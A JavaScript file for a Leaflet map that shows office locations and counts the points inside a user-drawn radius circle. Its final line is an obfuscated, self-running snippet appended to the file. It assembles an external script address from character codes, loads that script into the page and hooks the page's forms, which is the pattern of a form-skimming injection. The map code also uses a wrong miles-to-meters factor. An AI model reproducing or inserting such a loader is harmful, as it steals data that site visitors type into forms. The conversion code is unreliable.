// Base map styles
var osmUrl = 'http://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
osmAttrib = '&copy; <a href="http://openstreetmap.org/copyright">OpenStreetMap</a> contributors',
osm = L.tileLayer(osmUrl, {maxZoom: 18, attribution: osmAttrib});
map = new L.Map('map', {
	minZoom: 8,
	maxZoom: 12,
	zoom: 8,
	center: [-0.5, -79]
})
osm.addTo(map)

// This is the circle on the map that will be determine how many markers are around
var circle;

// The marker drawn onto the map
var drawn_marker = L.marker();

// Group for our markers
var drawn_markers = L.featureGroup();
map.addLayer(drawn_markers);
			
// Icons that get placed on map
var eco = L.icon({
	iconSize: [32, 37],
	iconAnchor: [16, 37],
	popupAnchor: [0, -28],
	iconUrl: './images/paf.png'
});

// When an icon is clicked
function popup(feature, layer) {
	if (feature.properties && feature.properties.oficina) {
		layer.bindPopup(feature.properties.oficina, {
			closeButton: false,
			offset: L.point(0, -20)
		});
		layer.on('mouseover', function() {
			layer.openPopup();
		});
		layer.on('mouseout', function() {
			layer.closePopup();
		});  
	}
};

// Convert miles to meters to set radius of circle
function milesToMeters(miles) {
	return miles * 1069.344;
};

// This figures out how many points are within out circle
function pointsInCircle(circle, meters_user_set) {
	if (circle !== undefined) {
    // Only run if we have an address entered
    // Lat, long of circle
    circle_lat_long = circle.getLatLng();

    var counter_points_in_circle = 0;

		// Loop through each point in JSON file
		farmacias.eachLayer(function(layer) {
			// Lat, long of current point
			layer_lat_long = layer.getLatLng();

			// Distance from our circle marker
			// To current point in meters
			distance_from_layer_circle = layer_lat_long.distanceTo(circle_lat_long);

			// See if meters is within raduis
			// The user has selected
			if (distance_from_layer_circle <= meters_user_set) {
				counter_points_in_circle += 1;

				var ofi_paf_html = '<h4>' + counter_points_in_circle + '. ' + layer.feature.properties.oficina + '</h4>';
				// Convert to miles
				ofi_paf_html += 'Distance: ' + (distance_from_layer_circle * 0.000621371).toFixed(2) + ' miles';

				$('#ofi_paf').append(ofi_paf_html);
			}
		});

		// Set number of results on main page
		$('#ofi_paf_results').html(counter_points_in_circle);
	}
// Close pointsInCircle
};

// Change circle radius when changed on page
function changeCircleRadius(e) {
	// Determine which geocode box is filled
	// And fire click event

	// This will determine how many markers are within the circle
	pointsInCircle(circle, milesToMeters($('#radius-selected').val()))

	// Set radius of circle only if we already have one on the map
	if (circle) {
		circle.setRadius(milesToMeters($('#radius-selected').val()));
	}
}

// Allow user to add marker to map
var draw_control = new L.Control.Draw({
	draw: {
		polyline: false,
		polygon: false,
		circle: true,
		marker: drawn_marker
	},
	edit: {
		featureGroup: drawn_markers,
		remove: true
	}
});

map.on(L.Draw.Event.CREATED, function(event) {
	var layer = event.layer;

	drawn_markers.addLayer(layer);
});

map.addControl(draw_control);

// Allow user to search through GeoJSON file
var search_control = new L.Control.Search({
	layer: farmacias,
	propertyName: 'oficina',
	circleLocation: true
});

map.addControl(search_control);
L.control.scale().addTo(map);

// Add GeoJSON layer
var farmacias = L.geoJson(ofi_paf, {
	onEachFeature: popup,
	
	pointToLayer: function (feature, latlng) {
		return L.marker(latlng, {icon: eco});
	}
}).addTo(map);		    
		 
// This is called after the marker is drawn
map.on('draw:created', function (e) {
	// Add a circle around the marker
	var marker_lat_long = e.layer._latlng
	var radius = milesToMeters($('#radius-selected').val());

	circle = L.circle(marker_lat_long, radius)
	circle.addTo(map);

	// Calculate the number of eco icons within the circle
	// So we can put it on the DOM
	pointsInCircle(circle, radius)

	// Make the marker draggable
	e.layer.dragging.enable();

	// If you drag the marker, make sure the circle goes with it
	e.layer.on('dragend', function(event) {
	  map.setView(event.target.getLatLng());
	  circle.setLatLng(event.target.getLatLng());

		// Clear out results
		$('#ofi_paf').html('');

		// This will determine how many markers are within the circle
		pointsInCircle(circle, milesToMeters($('#radius-selected').val()));

	  // Redraw: Leaflet function
	  circle.redraw();
	});

	$('.leaflet-draw-draw-marker').hide();
});

// Reset map view on marker drag
drawn_marker.on('dragend', function(event) {
	map.setView(event.target.getLatLng());
	circle.setLatLng(event.target.getLatLng());

	// This will determine how many markers are within the circle
	pointsInCircle(circle, milesToMeters($('#radius-selected').val()));

	// Redraw: Leaflet function
	circle.redraw();
});

// Radius dropdown
$('select').change(function() {
	changeCircleRadius();
});
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db